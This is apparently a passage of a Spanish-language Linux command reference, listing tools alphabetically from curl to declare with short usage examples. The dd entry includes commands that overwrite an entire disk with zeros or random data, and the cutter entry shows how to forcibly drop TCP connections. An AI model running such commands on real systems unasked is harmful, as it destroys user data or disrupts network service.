$ curl -u usuario:clave --silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if /<name>/; print "$2\n" if /<(title|name)>(.*)<\/\1>/;' (visualizar todos los mensajes no leidos de gmail)
$ curl -s 'http://geoiplookup.wikimedia.org/' | sed 's/^.*=\s*//' | python3 -mjson.tool (muestra la situación geográfica)
$ curl -s http://geoiplookup.wikimedia.org/ | python3 -c 'import sys, json, string, webbrowser; webbrowser.open(string.Template("http://maps.google.com/maps?q=$lat,$lon").substitute(json.loads(sys.stdin.read().split("=")[-1])))' (Lo mismo pero abriendo una pestaña en el navegador)
$ curl -s http://www.census.gov/popclock/data/population/world | awk -F'[:,]' '{print $7}' (Muestra el número de habitantes de la tierra)
$ curl -s https://help.github.com/articles/generating-ssh-keys | grep -Po  --color=never "RSA key fingerprint is (:?[A-z0-9]\:?){32}" (Imprime la clave RSA de github.com)
$ curl -s -w 'Test de velocidad para :%{url_effective}\n\nLookup Time:\t\t%{time_namelookup}\nConnect Time:\t\t%{time_connect}\nPre-transfer Time:\t%{time_pretransfer}\nStart-transfer Time:\t%{time_starttransfer}\n\nTotal Time:\t\t%{time_total}\n' -o /dev/null http://www.google.com (Tiempo de respuesta de un sitio web. Cambiar la url final)


curlftpfs
Montar directorios remotos en local.
# curlftpfs usuario:contraseña@192.168.1.10 /media/servidor
Para automatizar el proceso, añadir al /etc/fstab la linea:
curlftpfs#usuario:contraseña@192.168.1.10 /media/servidor fuse defaults 0 0


cut
Permite buscar y/o seleccionar columnas o campos dentro de un archivo estructurado. Entre campo y campo debe existir obligatoriamente un delimitador [dos puntos, un espacio en blanco u otro carácter].
$ cut -c1-4 archivo  (muestra los 4 primeros caracteres de cada linea)
$ cut -d: -f1 archivo  (Muestra el primer campo delimitado por “:”)
$ cut -d" " -f1,5 archivo  (Mostrar el primero y el quinto, separados por espacio)
$ cut -d" " -f 2- archivo (Mostrar todo menos la primera columna)
$ cut -s -d"(" -f1 archivo ("-s" suprime las lineas que no contengan el delimitador [(]). De las que sí lo contengan, mostraría el 1er campo)
$ echo $RANDOM | cut -c1,2 (Coger los 2 primeros números de un número aleatorio [$RANDOM])


cutter
Envia paquetes a ambos extremos de una conexión TCP/IP para cerrar la conexión. Está diseñado para desconectar conexiones no deseadas hacia o desde una dirección IP específica o par de direccioes IP o cerrar el servicio específico de un puerto.
$ cutter 192.168.1.10 (cerrar la conexión de la ip especificada)
$ cutter 192.168.1.10 22 (cerrar la conexión al puerto 22 de la ip especificada)
$ cutter 448.22.71.130 192.168.1.10 22 (cerrar conexión entre dos computadoras por el puerto 22)


cutycapt
Utilidad para capturar renderizado WebKit de una página web.
$ cutycapt --url=google.es --out=localfile.png (especificando la url y nombre del archivo para la salida)


cvlc
Modo de la aplicación vlc [ver] usado como reproductor de música.
$ cvlc archivo.mp3
$ cvlc v4l2:///dev/video0 (activar cámara web)
Algunas teclas de control:
	Ctrl + mayusc + space (Reproducir/pausar)
	Ctrl + mayusc + n (siguiente archivo)
	Ctrl + mayusc + p (archivo anterior)
	Ctrl + mayusc + flecha arriba (Subir volumen)
	Ctrl + mayusc + flechas abajo (Bajar volumen)
	Ctrl + mayusc + m (Silenciar)
	Ctrl + mayusc + q (Salir)


cwcp
Proporciona soporte para aprender a usar el código Morse. Este paquete proporciona un tutor interactivo de código Morse con una interfaz de usuario de pantalla completa basada en texto (ncurses).
$ cwcp


cycle
Calendario para mujeres. Dada una duración del ciclo o estadísticas de varios períodos, puede calcular los días hasta la menstruación, los días de sexo "seguro", el período fértil y los días hasta la ovulación. Permite al usuario escribir notas y ayuda a supervisar la administración de anticonceptivos hormonales.
$ cycle


dansguardian
[squid]. Filtro de contenidos web [cliente] que trabaja conjuntamente con el servidor proxy squid [servidor].
Adaptar el archivo de configuración:
# nano /etc/dansguardian/dansguardian.conf
Algunos parámetros a especificar [caso de no estarlo]:
	language = 'spanish'
	reportinglevel = 3 #valores de 1, 2 y 3
	filterport = 8080
	proxyip = 127.0.0.1 #La misma ip del proxy squid
	proxyport = 3128
Guardar el archivo.
El listado de conceptos [ip, nombre de dominio, frases... ] por los que se puede banear y conceptos excluidos en:
# ls /etc/dansguardian/lists/
Algunos de los más usuales:
bannedextensionlist (extensiones no permitidas)
banneriplist (listado de ips no permitidas)
bannedmimetypelist (Tipos MIME no permitidos)
bannedregexpurllist  (Listado de expresiones a bloquear)
bannedurllist (Bloquear partes especificas de un sitio)
bannedsitelist (Bloquear sitios)
bannedphraselist (Listado de frases prohibidas encerradas entre < >
exceptionsitelist (Lista de excepciones de sitios)
exceptioniplist (lista de excepciones de direcciones IP)
exceptionuserlist (Lista de excepciones de nombres de usuarios que no serán filtrado)
# /etc/init.d/dansguardian restart


daptup
Muestra lista de paquetes ingresados recientemente al repositorio y lista los paquetes que han tenido actualizaciones. Este comando no necesita ser llamado explícitamente ya que se llama automaticamente por todos los gestores de paquetes compatibles.
# daptup --pre
# daptup --post
# daptup --last


darcs
Es un sistema de control de versiones gratuito y de código abierto.
$ darcs init (iniciar un nuevo repositorio)
$ darcs add archivo.txt (agregar archivo al repositorio)
$ darcs record -a (hacer un commit inicial)
$ darcs status (verificar el estado del repositorio)
$ darcs changes (verificar la historia del repositorio)
$ darcs revert (deshacer cambios)
$ darcs diff --from=commit1 --to=commit2 (revisar diferencias entre dos commits)
$ darcs pull (fusionar cambios del repositorio)
$ darcs push (enviar cambios al repositorio remoto)
$ darcs verify (verificar la integridad del repositorio)


dares
Rescatar contenido de cds y dvds dañados
$ dares -i image_cdrom -s /tmp (salvar en /tmp)


darkhttpd
Servidor de archivos via web. Acceso por navegador con http://url_o_ip:puerto.
$ darkhttp /home/usuario/share --port 12001 --daemon (Directorio, puerto de escucha 12001 y dejando como demonio. Matar con killall darkhttpd)
$ darkhttp /home/usuario/share --port 12001 --log  archivo  --chroot  (Sin dejar en background. Creando un archivo con las incidencias y bloqueando el servidor en el directorio especificado. Matar con ctrl+c)


darkstat
Monitorizar el tráfico de red. Configurar la herramienta:
# nano /etc/darkstat/init.cfg
Descomentar los parámetros DIR, PORT, BINDIP y LOCAL y modificar START_DARKSTAT=yes
Arrancar el servicio:
# /etc/init.d/darkstat start
En el navegador colocar la dirección: localhost:667


datalad
Plataforma de distribución y gestión de datos que brinda acceso a una amplia gama de recursos de datos que están disponibles en línea.
$ datalad create mi_dataset (crear un nuevo dataset en la carpeta actual con el nombre "mi_dataset")
$ datalad install https://example.com/mi_dataset.git (descargar e instalar un dataset existente en la máquina local)
$ datalad get mi_dataset/carpeta/archivos (obtener todos los archivos de una carpeta específica)
$ datalad publish mi_dataset (que el dataset se publique en un servidor conocido por DataLad)
$ datalad update mi_dataset (actualizar un dataset existente en la máquina local)
$ datalad search palabra ("palabra" es la clave que se desea buscar)
$ datalad clone mi_dataset (clonar un dataset existente)


date
Relacionado con fechas y calendarios.
$ date +%s  (en tiempo unix - desde el 1 de enero de 1970-)
$ date -d @1441543931 (Pasar fecha unix a normal)
$ date -s "2010-01-10 16:59"  (forma de establecer la fecha y hora actual)
$ date –u 0110170210  (Otra forma de establecer la fecha. mes 01, día 10, hora 17:02 y año 2010)
$ date +"%A,%d-%m-%Y"
Algunas opciones:
	%D (fecha en formato mm/dd/yy)
	%T (hora:minutos:segundos en formato 24h)
	%R (hora:minutos en formato 24h)
	%d (día del mes con 2 dígitos)
	%m (mes con 2 digitos)
	%y (año con 2 dígitos)
	%Y (año con 4 dígitos)
	%a (nombre abreviado del día)
	%A (nombre completo del día)
	%b (nombre abreviado del mes)
	%B (nombre completo del mes)
	%H (hora con 2 dígitos en formato 0-24h)
	%I (hora con 2 digitos en formato 0-12h)
	%M (Solo los minutos)
	%S (Solo los segundos)
$ date +"%A,%d-%m-%Y" --date '1966/4/20 20500 days' (Para saber cuando alguien cumplirá 20500 días desde su nacimiento)
$ watch -n1 'banner `date +%T`' (Rejoj digital en ascii)
1.-
Saber la hora encualquier parte del mundo:
$ TZ="America/Guatemala" date (Muestra la hora actual de Guatemala)
$ TZ="Europe/Berlin" date (Muestra la de Berlin)


datefudge
Pretende que el tiempo del sistema sea diferente. No lo altera.
$ datefudge "2115-10-23 11:20" date -R
$ datefudge "2127-03-05 12:30" date +%s
$ datefudge "23 Oct 2210" date -R
$ datefudge "2136-10-23 09:33" sh -c "sleep 3; date -R"


dateutils
Varias herramientas que giran en torno a fechas y horas entre zonas horarias (dateutils.dadd, dateutils.ddiff, dateutils.dround, dateutils.dsort, dateutils.dzone, dateutils.dconv, dateutils.dgrep, dateutils.dseq, dateutils.dtest, dateutils.strptime). Si se omite fecha/hora, el valor predeterminado es 'ahora'.
$ dateutils.dzone Europe/Madrid Australia/Sydney America/Bogota today (fecha exacta de varias ciudades)
$ dateutils.dzone Europe/Madrid Australia/Sydney (lo mismo)
$ dateutils.ddiff 2022-02-15 2023-01-05 (muestra los dias de diferencia entre dos fechas)
$ dateutils.ddiff 9:00:00 13:05:00 -f '%H:%M:%S' (mostrará la diferencia en horas, minutos y segundos)
$ dateutils.dround -n 10:02:00 5s (aumenta la fecha en 5 segundos)


dav
[dav-text]. Editor minimalista para ncurses.
$ dav archivo.txt


davpass
Sistema de archivos virtual para acceder a archivos, imágenes de disco y ubicaciones remotas
$ davpass -h HOST -u usuario -p paswdr


dbmmanage
Se utiliza para crear y actualizar los archivos de formato DBM utilizados para almacenar los nombres de usuario y la contraseña para la autenticación básica de los usuarios HTTP a través de mod_authn_dbm. Los recursos disponibles en el servidor Apache HTTP pueden ser restringidos sólo a los usuarios listados en los archivos creados por dbmmanage. Este programa sólo puede ser usado cuando los nombres de usuario están almacenados en un archivo DBM. Para usar una base de datos de archivo plano, ver htpasswd. Otra herramienta para mantener una base de datos de contraseñas DBM es htdbm.
# dbmmanage archivo view USER (archivo de formato DBM sin la extensión .db, .pag, o .dir del usuario especificado)
# dbmmanage archivo adduser USER (añadir un usuario a una base de datos "archivo")
# dbmmanage archivo delete USER (eliminar un usuario)


dbus-test-runner
Ejecutable para ejecutar un par de programas bajo una nueva sesión DBus. Esta herramienta hace pruebas unitarias de código de acceso a DBus en tiempo de ejecución.
$ dbus-test-runner (de todos los parámetros por defecto)


dc
calculadora. Los operadores se colocan antes que sus operandos.
$ echo "5 2 + p" | dc (Se introducen dos números [5 y 2] se indica la operación a realizar [+] y que muestre el resultado [p])
$ echo "4 6 + 2 * 4 / p" | dc
$ echo "40034291 23 % p " | dc (Da el resto de la división)


dconf
Restablece los parámetros o configuración por defecto de entornos de escritorio Unity, GNOME y MATE.
$ dconf reset -f /


dcfldd
Versión moderna de dd que muestra el progreso así como informar si se producen errores. Soporta en teoría los mismos parámetros que el comando dd original
# dcfldd if=imagen.iso of=/dev/sde bs=1M


dd
Crea imagenes de discos, particiones ...
$ dd if=/dev/zero of=/dev/hda  (escribe ceros en todo el disco)
$ dd if=/dev/urandom of=/dev/hda  (llena el disco de números aleatorios)
$ dd if=/dev/hdx of=backup-mbr bs=512 count=1  (crea una copia de seguridad del mbr)
$ dd if=backup-mbr of=/dev/hda bs=512 count=1  (la restaura)
$ dd if=mbr of=/dev/hda (Restaurarla)
$ dd if=/dev/hda1 of=/dev/hda3 (copiar una partición)
$ dd if=/hda of=/hdb bs=1M (copiar un disco en bloques de 1 mega)
$ dd conv=noerror if=/dev/cdrom of=imagen_con_errores.img (Evitar que los errores impidan copiar datos. ütil en la recuperación de CDs o discos dañados)
$ dd if=/dev/sda of=/dev/sdb conv=noerror,sync (Realizar una copia exacta de una partición, evitando que los errores impidan copiarla)
$ time dd if=/dev/zero of=TEST bs=4k count=512000  (Realizar un test de velocidad del disco duro)
$ dd if=/dev/sda1 of=copia_seguridad.tar | pv  (copiar mostrando barra de progreso)
$ dd if=/dev/sdc bs=4096 dd of=/home/usuario/copia_seguridad | pv -s 2G (Lo mismo que el anterior)
$ dd if=/dev/hda of=/home/hda.iso (Crear una imagen iso de una partición)
$ dd if=/dev/hda | gzip > /home/hda.bin.gz (Crear una imagen comprimida)
$ dd bs=1M if=/dev/sda4 | ssh usuario@host 'dd of=/home/usuario/sda4.img' (crear una imagen de una partición local en un pc remoto)
$ dd if=/dev/cdrom of=~/cd_image.iso (Crear una ISO del cd)
# dd if=/dev/sda | pv | dd of=/dev/sdb bs=1M (Clonar partición viendo gráfico del proceso)


ddate
Convierte fechas gregorianas en fechas subrealistas. Algunas opciones coinciden con las de "date" (ver)
$ ddate (forma básica)
$ ddate +%d-%B-%Y
$ ddate +'Hoy es %{%A, el %e de %B%}, %Y. %N%nCelebrate %H'


ddccontrol
Herramienta que se utiliza para controlar los parámetros del monitor, como el brillo y el contraste.
# ddccontrol -p (sondear dispositivos i2c)
# ddccontrol -r 0x10 dev:/dev/i2c-4 (leer el valor del control 0x10 [brillo en monitores compatibles con VESA] para el dispositivo dev:/dev/i2c-4)


ddclient
Configurar pc con una ip fija. Requiere registro en dyndns.org. Durante la instalación preguntará los datos del registro pero si se prefiere puede editarse el archivo de configuración y colocarlos a mano
# gedit /etc/ddclient.conf
Completar los campos login y password con los datos correspondientes:
protocol=dyndns2
use=web, web=checkip.dyndns.com, web-skip='IP Address'
server=members.dyndns.org
login=Nombre_registrado_en_dyndns
password='contraseña_de_dyndns'
nombre_de_dominio.dyndns.com
# ddclient -daemon=0 -debug -verbose -noquiet (forzar la ejecución de ddclient)


ddcutil
Utilidad para consultar y cambiar la configuración del monitor.
# ddcutil detect (detectar la configuración)
# ddcutil detect --brief (informe resumido de cada pantalla detectada)
# ddcutil capabilities (caracteristicas del monitor)
# ddcutil environment (Probar el entorno de instalación de ddcutil)
# ddcutil probe (Explorar las capacidades y características de un solo monitor)


ddgr
Utilidad para hacer busquedas con DuckDuckGo desde la terminal. Abrira las busquedas con el navegador predeterminado a menos que se lance:
$ export BROWSER=w3m
$ ddgr linux emacs
Las teclas que se usan son las del navegador escogido.


ddrescue
[make gcc g++]. Recuperación de discos dañados. Proceso:
Descargar el paquete dd_rhelp (Comprobar si existe una versión posterior):
$ wget http://www.kalysto.org/pkg/dd_rhelp-0.1.2.tar.gz
$ cd dd_rhelp-0.1.2
# ./dd_rhelp /dev/sdbx sdbx.img
Creará sdbx.img en el directorio actual, que podrá montarse:
# mount -o loop sdbx.img /media/imagen
Comprobar posibles errores (para partición ext3):
# fsck -y sdbx.img
Restaurar la imagen:
# dd_rhelp sdbx.img /dev/sdax
Método de ejecutar ddrescue en dos pasadas, de forma que la primera sólo recupera los bloques que no contenga sectores defectuosos y el segundo se centre en recuperar el máximo de los defectuosos:
# ddrescue -v -n /dev/sda /dev/sdb sda.txt
# ddrescue -v -r2 -d /dev/sda /dev/sdb sda.txt
Luego comprobar errores con fsck.


ddupdate
Actualiza las direcciones IP dinámicas que normalmente se obtienen mediante DHCP con servicios DNS dinámicos como changeip.com, duckdns.org o no-ip.com entre otros. Crear el archivo:
# nano /etc/ddupdate.conf
Con el siguiente contenido:
	[update]
	address-plugin = default-if
	service-plugin = dry-run
	hostname = NOMBRE.duckdns.org
	ip-version = v4
	loglevel = warning
# ddupdate -H NOMRE.duckdns.org
# ddupdate -S (mostrar servicios de dns)


deallocvt
Libera memoria y estructuras de datos del núcleo para todas las consolas virtuales que no se usen. Una consola virtual se considera en desuso si no es la consola en primer plano, ni  ningún  proceso  la  tiene  abierta  para  lectura  o escritura, ni se ha seleccionado ningún texto en su pantalla. Ver openvt
# deallocvt (Las desasigna todas)
# deallocvt 5 (Sólo desasigna la /dev/tty5)
Un ejemplo de uso:
# openvt -s ls (lanzara el comando ls en la primera consola virtual libre. Normalmente la /dev/tty8)
# deallocvt 8


deb
Extensión de los paquetes para distros Debian.
1.-
Crear un paquete para esta distro a partir de un script:
	$ mkdir deb
En ese directorio recrear la estructura destino que queremos utilizar. En nuestro caso /usr/bin, el directorio para el icono y permisos:
	$ mkdir -p deb/usr/bin
	$ mkdir -p deb/usr/share/applications
Copiar el script en el bin creado:
	$ cp script deb/usr/bin
Crear el subdirectorio DEBIAN:
	$ mkdir deb/DEBIAN
En su interior el fichero “control”:
	$ nano deb/DEBIAN/control
En el que pegamos datos del paquete:
Package: nombre_que_queremos
Priority: optional
Section: misc
Maintainer: el_mantenedor
Architecture: all
Version: 1.0
Depends: Las_dependendias_del_paquete
Description: Pequeña_descripción_de_la_maravilla
 Este script .... para ..... de ..... aquello.......
Notas: En el nombre del paquete (Package) no se admiten espacios ni barras bajas) y en la descripción (Description) el primer carácter de la segunda linea es un espacio y al final del texto, darle al intro para que ponga una linea vacia. Las dependencias que pongamos en “Depends” son las que se instalarán  con la instalación del .deb.
Crear el paquete “menu” en el mismo directorio:
	$ nano deb/DEBIAN/menu
Y en su interior pegar:
    	?package(nombre_script):needs="X11" \
		section="Applications/Network/Monitoring" \
		title="Suport VNC" command="gnome-terminal -e script_que_sea" \
		icon="/usr/share/pixmaps/gnome-term-linux2.png"
Notas: Nombre del paquete, que precisa de las X (X11), donde se colocará en el menú “Aplicaciones” (otras opciones: section=”Apps/Multimedia”...), el comando que lo lanzará (gnome-terminal -e script) y el icono que hemos escogido. Crear el archivo nombre_script.desktop para los datos del icono:
	$ gedit deb/usr/share/applications/nombre_script.desktop
Y pegar el siguiente contenido:
	[Desktop Entry]
	Version=1.0
	Name=Nombre_script
	GenericName=Nombre_script
	Comment=Pequeño_comentario
	Exec=Nombre_script_que_lo_lanzará
	Terminal=true
	Type=Application
	Categories=Application;Network;
	Icon=gnome-term-linux2.png
	StartupNotify=true
Nota.- también varios modelos de iconos en:
	$ ls /home/usuario/.local/share/applications/
Cambiar el propietario del directorio:
	# chown -R root.root deb
Finalmente crear el paquete .deb y que lo coloque en el escritorio:
	# dpkg -b deb /home/usuario/Escritorio/nombre.deb
2.-
Crear un paquete a partir de un tar.gz:
Para el ejemplo usaremos el paquete picpuz, un juego para crear puzles a partir de una fotografia, que aunque tenga versión .deb, para el caso nos sirve.
Crear carpeta de trabajo y entrar en ella:
	$ mkdir picpuz
	$ cd picpuz
Descargar y descomprimir el tar.gz y entrar en la carpeta descomprimida:
$ wget http://kornelix.squarespace.com/storage/downloads/picpuz-2.2.tar.gz
$ tar xvzf picpuz-2.2.tar.gz
$ cd picpuz-2.2
Crear el nuevo paquete .orig.tar.gz con los estandares de Debian, con licencia gpl3 y generando el paquete desde las fuentes:
	$ dh_make --createorig  -c gpl3 -s
Construir el paquete .deb:
	$ dpkg-buildpackage -rfakeroot
Listar el contenido de un paquete .deb:
	$ ar -tv picpuz_2.2-1_i386.deb
Información y perspectiva general de lo que ofrece el paquete:
	$ dpkg-deb -I picpuz_2.2-1_i386.deb
Listar los ficheros que serán instalados:
	$ dpkg-deb -c picpuz_2.2-1_i386.deb
instalarlo:
	# dpkg -i picpuz_2.2-1_i386.deb
Lo encontraremos en aplicaciones/juegos


debcheckout
Recupera la información sobre el sistema de control de versiones utilizado para mantener un paquete Debian dado y luego verifica la última versión del paquete de su repositorio.
$ debcheckout nano
	declared git repository at https://anonscm.debian.org/git/collab-maint/nano.git
	git clone https://anonscm.debian.org/git/collab-maint/nano.git nano ...
	S'està clonant a 'nano'...
	remote: Counting objects: 3577, done.
	remote: Compressing objects: 100% (2271/2271), done.
	remote: Total 3577 (delta 2489), reused 2148 (delta 1163)
	S'estan rebent objectes: 100% (3577/3577), 7.46 MiB | 527.00 KiB/s, fet.
	S'estan resolent les deltes: 100% (2489/2489), fet.
	$ ls | grep nano
	nano
	$ ls nano/
	ABOUT-NLS            compile       COPYING       install-sh     nano.spec     syntax
	aclocal.m4           config.guess  COPYING.DOC   lib            nano.spec.in  THANKS
	ar-lib               config.h.in   debian        m4             NEWS          TODO
	AUTHORS              config.rpath  depcomp       Makefile.am    po
	ChangeLog            config.sub    doc           Makefile.in    README
	ChangeLog.1999-2006  configure     IMPROVEMENTS  missing        README.GIT
	ChangeLog.2007-2015  configure.ac  INSTALL       mkinstalldirs  src


debconf
Es un sistema de configuración para paquetes Debian. Debconf proporciona una interfaz consistente para configurar paquetes, permitiéndo elegir entre varias interfaces de usuario. Permite preconfigurar paquetes antes de instalarlos.
$ debconf -f readline sh -x script.sh (con la interfaz [f] y la orden de ejecución [x] para el script mencionado)


debdate
Convertir fechas gregorianas en fechas respecto de las versiones de Debian.
	$ debdate -d 2020-05-20
	Today is day 141 of year 2 of the Buster
$ debdate


debdelta
Herramienta diseñada para calcular cambios entre paquetes Debian. Significa que en lugar de descargar un paquete completo, solo se descarga el cambio necesario entre la versión actual instalada y la nueva versión disponible.
# debdelta-upgrade (actualizar la base de datos buscando en los servidores los paquetes instalados y las versiones nuevas, descargando solo los cambios)
# debdelta download vim (conseguir un delta especifico para un paquete)
# debdelta paquete_1.0.deb paquete_1.1.deb (generar un archivo delta que contiene los cambios entre las dos versiones)
# debpatch vim_8.1.deb vim_8.1-to-8.2.delta  (aplicará el delta al paquete original, generando la nueva versión sin tener que descargar el paquete)
# debdelta-clean (elimina los archivos delta que ya no son necesarios)


debfoster
Mantiene una lista de paquetes instalados que fueron explícitamente solicitados en lugar de ser instalados como una dependencia. Los argumentos son totalmente opcionales y debfoster puede ser invocado después de lanzar dpkg y/o apt-get.
# debfoster
Las opciones son:
       y (guardar paquete. opción por defecto)
       n (borrar paquete)
       p (que también elimine todos los paquetes que sólo están instalados porque este paquete depende de ellos. Si los hubiera se muestran en la parte superior de la ventana)
       s (omitir pregunta. La próxima vez que se ejecute preguntará de nuevo sobre este paquete)
       h (imprimir mensaje de ayuda)
       i o ? (mostrar información sobre el paquete)
       u (deshacer la última opción)
       q (salir sin quitar paquetes. Todos los cambios se perderán)
       x (Guardar cambios, eliminar los paquetes no deseados y salir)
# debfoster -u (recargar la base de datos)


debget
[debian-goodies]. Descarga un paquete .deb del repositorio o, caso de estar instalado, muestra la versión.
$ debget scribus
$ debget chromium


debian-faq
Preguntas más frecuentes con sus respuestas sobre la distribución de Debian GNU/Linux y sobre el proyecto Debian. El documento está disponible en https://www.debian.org/doc/manuals/debian-faq/. Puede accederse a él con el navegador en la dirección:
	file:///usr/share/doc/debian/FAQ/index.en.html


debian-goodies
Conjunto de herramientas diseñadas para integrarse con la shell estándar, extendiéndola para operar en el sistema de empaquetado de Debian. Algunas de las dependencias de algunos paquetes que intégran esta aplicación son opcionales, sugeridas o obligatorias. Los paquetes que integra son: check-enhancements, debget, debman, debmany, degrep, dfgrep, dglob, dgrep, dhomepage, dman, dpigs, dzegrep, dzfgrep, dzgrep, find-dbgsym-packages, popbugs, which-pkg-broke, which-pkg-broke-build y checkrestart.


debian-handbook
Accesible para todos, el Manual del administrador de Debian enseña los aspectos esenciales a todo aquel que quiera convertirse en un administrador de Debian GNU/Linux eficaz e independiente. Abarca todos los temas que un administrador competente de Linux debería dominar, desde la instalación y actualización del sistema, hasta la creación de paquetes y la compilación del núcleo, pero también la monitorización, las copias de seguridad y la migración, sin olvidar temas avanzados como la configuración de SELinux/AppArmor para proteger servicios, instalaciones automatizadas o virtualización con Xen, KVM o LXC. El Manual del administrador de Debian ha sido escrito por dos administradores de Debian.
$ firefox file:///usr/share/doc/debian-handbook/html/


debian-history
Historia de la distro Debian. Los idiomas disponibles son: Inglés, francés, alemán, italiano, japonés, coreano, portugués, ruso y lituano. Colocar en la barra de navegación [para el idioma francés]:
	http://usr/share/doc/debian-history/fr/index.fr.html


debian-info
Muestra las versiones de las distros debian y ubuntu.
$ debian-info --all (de todas)
$ debian-info --stable (la última versión estable)
$ debian-info --testing (la última versión testing)


debian-reference
Esta referencia de Debian está destinada a proporcionar una visión general del sistema Debian como una guía del usuario posterior a la instalación. Acceder a ella entrando en el navegador:
file:///usr/share/debian-reference/apa.es.html


debian-security-support
Para algunos paquetes Debian, no es posible mantener un soporte de seguridad completo para todos los casos de uso durante todo el ciclo de lanzamiento de la distribución. Este paquete proporciona un programa para identificar los paquetes instalados para los que se ha tenido que limitar o finalizar prematuramente el soporte y para alertar al administrador. Se proporcionarán nuevas versiones de este paquete con listas de verificación actualizadas a través del soporte de seguridad estándar y/o extendido.
$ debian-security-support check openssh-server (verificar el soporte de seguridad para un paquete)
$ debian-security-support list --unsupported (listar todos los paquetes sin soporte completo de seguridad)
$ debian-security-support list --limited (paquetes con soporte limitado de seguridad)
$ debian-security-support info openssh-server (mostrar detalles detallados de un paquete específico)


debian-timeline
Línea de tiempo del proyecto Debian basado en Javascript y HTML: Versiones, bugs, lanzamientos importantes... Colocar en la barra de navegación:
	http://usr/share/debian-timeline/index.html


debianutils
Proporciona una serie de pequeñas utilidades que son utilizadas principalmente por los scripts de instalación de paquetes Debian, aunque pueden usarse directamente. Dichas utilidades son:
ischroot, savelog, which.debianutils, add-shell, remove-shell y update-shells.


debmirror
Este programa descarga y mantiene un espejo local parcial de Debian. Puede reflejar cualquier combinación de arquitecturas, distribuciones y secciones. Los archivos se transfieren por FTP, HTTP, HFTP o rsync, y los grupos de paquetes son totalmente compatibles. También realiza el bloqueo y actualiza los archivos de seguimiento.
# debmirror --method http --host ftp.debian.org --dist sid --dir /var/spool/apt-mirror/mirrors/sid --arch "amd64 i386" --ignoremissing --noverbose (crea un espejo del repositorio "sid" [desarrollo] para arquitecturas amd64 e i386 en el directorio especificado)
# debmirror --method http --host ftp.debian.org --dist bullseye --dir /var/spool/apt-mirror/mirrors/bullseye --arch amd64 --components main contrib non-free --ignoremissing --noverbose (crea un espejo más específico y detallado de Bullseye para la arquitectura amd64, incluyendo los componentes main, contrib y non-free)
Las opciones:
    --method: Especifica el método de acceso (http, ftp, etc.)
    --host: Dirección del servidor del repositorio
    --dist: Nombre del repositorio (por ejemplo, "bullseye", "stable", "unstable")
    --dir: Directorio local donde se almacenará el espejo
    --components: Los componentes que incluye [main, contrib y non-free]
    --arch: Arquitecturas a incluir
    --ignoremissing: Ignora paquetes que ya existen en el espejo
    --noverbose: Reduce la cantidad de información mostrada durante la ejecución


debomatic
Es una máquina de compilación fácil de usar para paquetes fuente de Debian basada en sbuild y schroot, escrita en Python. Proporciona una herramienta simple para automatizar la compilación de paquetes fuente con interacción limitada del usuario y una configuración simple. Tiene algunas características útiles como actualización automática de chroots, escaneo automático y selección de paquetes fuente para compilar y compatibilidad con módulos. Está pensada para ayudar a los desarrolladores a compilar sus paquetes sin preocuparse demasiado por la compilación, ya que se ejecutará en segundo plano y no se requiere retroalimentación del usuario durante todo el proceso. Primero el archivo de configuración:
# nano /etc/debomatic/main
  [default]
  builder: pbuilder
  packagedir: /home/usuario/debomatic
  configdir: /etc/debomatic/distributions
  maxbuilds: 3
  inotify: 1
  sleep: 60
  logfile: /var/log/debomatic.log
  gpg: 1 # Para habilitar el control de firmas
  gpgkey: /ruta/a/tu/clave_privada.asc
  [distributions]
  unstable:
    dist: sid
    arch: amd64
  testing:
    dist: bullseye
    arch: arm64
# debomatic add <nombre-del-paquete> (agregar un nuevo paquete a construir)
# debomatic start (iniciar los procesos de construcción)
# debomatic stop (parar los procesos)
# debomatic status (ver el estado actual)
# debomatic remove <nombre-del-paquete> (eliminar un paquete de la cola)


debootstrap
Instalar un sistema Debian dentro de un directorio de nuestro sistema para hacer pruebas o realizar instalaciones de otra arquitectura diferente.
# mkdir /mnt/debian-i386/ (Crear el directorio)
# debootstrap --arch=i386 wheezy /mnt/debian-i386/ http://ftp.debian.org/debian/
# chroot /mnt/debian-i386 (Entrar en el nuevo sistema. Ver chroot)


deborphan
Visualizar paquetes huerfanos
$ deborphan --guess-all   (Los muestra todos)
# apt-get remove $(deborphan --guess-all)     (borra todos los mostrados)
# deborphan        (para ver las librerias huérfanas)
# dpkg -l $(deborphan)    (lo mismo que el anterior con más detalles)
# sudo dpkg --purge $(deborphan)   (eliminar los paquetes huérfanos)
	# apt-get remove `deborphan` (Lo mismo)
# dpkg -l $(deborphan --find-config)  (para borrar configuraciones que no se han borrado tras la desinstalación de un paquete)
# dpkg --purge $(deborphan --ind-config)  (para eliminarlos)
# apt-get remove $(deborphan --guess-all)
Nota.- Normalmente estas aplicaciones han de repetirse varias veces hasta que al lanzar el comando no salga ninguna archivo huerfana.
# deborphan | xargs sudo apt-get -y remove --purge (otra forma de eliminar paquetes huerfanos)


debsecan
Efectúa una evaluación de seguridad del sistema y muestra las vulnerabilidades conocidas y asociadas a los paquetes instalados, notificando al administrador (root) los resultados.
# debsecan-create-cron (ejecutar diariamente)
# dpkg-reconfigure debsecan (realizar una correcta configuración)
# debsecan  --suite buster --format report --update-history (escaneos)
# debsecan  --suite buster --only-fixed (otro tipo de escaneo)
# debsecan --update-history (actualizar el archivo histórico después de la presentación de informes)


debsums
Verificar la integridad de los ficheros.
# debsums -s &> log.txt  (Modo silencioso [-s] y redirigiendo el resultado a un archivo para posterior análisis)
# cat log.txt | grep "mismatch" | cut -d " " -f4 | uniq > reinstall.txt (A partir del archivo anterior, listar los que se han de reinstalar)
# debsums -s | grep "mismatch" | cut -d " " -f4 | uniq > reinstall.txt (Lo mismo)
# apt-get install --reinstall `(cat reinstall.txt)`  (para instalarlos a partir del listado)


debtree
Genera gráficos en forma de archivo .dot de las dependencia de un paquete .deb.
$ deptree apt > apt.dot
$ dot -Tpng -o apt.png apt.dot (crear el png con dot)
$ gpicview apt.png (visualizar el gráfico generado con deptree)


debugfs
Depurador de sistemas ext. Permite consultar datos del sistema en tiempo real.
# debugfs (Entra en el promt de la aplicación. Pulsar letra "q" para salir del promt)
  debugfs 1.42 (29-Nov-2011)
  debugfs: help (Muestra un listado de todas las opciones)
  debugfs: open /dev/sda2 (Abre un sistema de archivos)
  debugfs: stats (información de los superbloques)
# debugfs /dev/hda4
# debugfs -R 'stat <1706790>' /var/log/syslog
Nota.- El nodo lanzando:
       # stat /var/log/syslog


declare
Listar las variables de entorno. En caso de que una función tenga el mismo nombre que un script tiene preferencia la función. Usado principalmente en scripts.
